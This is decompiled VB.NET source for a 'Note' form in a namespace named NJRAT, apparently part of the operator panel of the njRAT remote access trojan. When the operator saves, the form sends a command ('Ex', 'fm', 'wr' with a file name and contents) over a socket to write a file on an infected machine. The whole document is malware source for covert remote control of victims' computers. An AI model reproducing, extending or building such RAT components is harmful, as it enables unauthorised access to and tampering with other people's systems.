Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x0200001F RID: 31
	<DesignerGenerated()>
	Public Partial Class Note
		Inherits Form

		' Token: 0x06000290 RID: 656 RVA: 0x0001822C File Offset: 0x0001642C
		Public Sub New()
			Me.InitializeComponent()
		End Sub

		' Token: 0x170000DE RID: 222
		' (get) Token: 0x06000293 RID: 659 RVA: 0x0001852E File Offset: 0x0001672E
		' (set) Token: 0x06000294 RID: 660 RVA: 0x00018538 File Offset: 0x00016738
		Friend Overridable Property MenuStrip1 As MenuStrip

		' Token: 0x170000DF RID: 223
		' (get) Token: 0x06000295 RID: 661 RVA: 0x00018541 File Offset: 0x00016741
		' (set) Token: 0x06000296 RID: 662 RVA: 0x0001854C File Offset: 0x0001674C
		Friend Overridable Property ToolStripMenuItem1 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ToolStripMenuItem1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem1_Click
				Dim toolStripMenuItem As ToolStripMenuItem = Me._ToolStripMenuItem1
				If toolStripMenuItem IsNot Nothing Then
					RemoveHandler toolStripMenuItem.Click, value2
				End If
				Me._ToolStripMenuItem1 = value
				toolStripMenuItem = Me._ToolStripMenuItem1
				If toolStripMenuItem IsNot Nothing Then
					AddHandler toolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000E0 RID: 224
		' (get) Token: 0x06000297 RID: 663 RVA: 0x0001858F File Offset: 0x0001678F
		' (set) Token: 0x06000298 RID: 664 RVA: 0x0001859C File Offset: 0x0001679C
		Friend Overridable Property TextBox1 As TextBox
			<CompilerGenerated()>
			Get
				Return Me._TextBox1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Dim value2 As EventHandler = AddressOf Me.TextBox1_TextChanged
				Dim textBox As TextBox = Me._TextBox1
				If textBox IsNot Nothing Then
					RemoveHandler textBox.TextChanged, value2
				End If
				Me._TextBox1 = value
				textBox = Me._TextBox1
				If textBox IsNot Nothing Then
					AddHandler textBox.TextChanged, value2
				End If
			End Set
		End Property

		' Token: 0x06000299 RID: 665 RVA: 0x000185E0 File Offset: 0x000167E0
		Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Dim array As String() = New String(8) {}
			array(0) = "Ex"
			array(1) = Class7.string_1
			array(2) = "fm"
			array(3) = Class7.string_1
			array(4) = "wr"
			array(5) = Class7.string_1
			array(6) = Class6.smethod_14(Me.FN)
			array(7) = Class7.string_1
			Dim textBox As TextBox = Me.TextBox1
			Dim text As String = textBox.Text
			textBox.Text = text
			array(8) = Class6.smethod_14(text)
			Me.SK.Send(String.Concat(array))
			Me.ToolStripMenuItem1.Enabled = False
		End Sub

		' Token: 0x0600029A RID: 666 RVA: 0x0001867B File Offset: 0x0001687B
		Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs)
			Me.ToolStripMenuItem1.Enabled = True
		End Sub

		' Token: 0x0400017F RID: 383
		Public FN As String

		' Token: 0x04000180 RID: 384
		Public SK As Client
	End Class
End Namespace
